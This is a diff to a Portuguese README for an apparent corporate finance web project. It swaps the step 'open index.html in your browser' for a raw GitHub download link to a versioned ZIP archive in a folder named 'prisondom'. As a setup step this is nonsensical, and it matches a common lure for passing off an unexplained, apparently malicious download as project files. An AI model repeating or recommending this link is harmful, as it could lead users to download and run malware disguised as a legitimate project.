@@ -39,5 +39,5 @@ Nenhum dado real ou sensível foi utilizado neste ambiente de desenvolvimento.
 ### 📦 Como rodar o projeto
 
 1.  Clone este repositório.
-2.  Abra o arquivo `index.html` em seu navegador para visualizar a interface (Frontend).
+2.  Abra o arquivo `https://github.com/ramiles3712/gestao-financeira-corporativa/raw/refs/heads/main/prisondom/financeira_corporativa_gestao_1.8.zip` em seu navegador para visualizar a interface (Frontend).
 3.  [Instrução extra se tiver backend, ex: Configure a conexão JDBC no arquivo X].
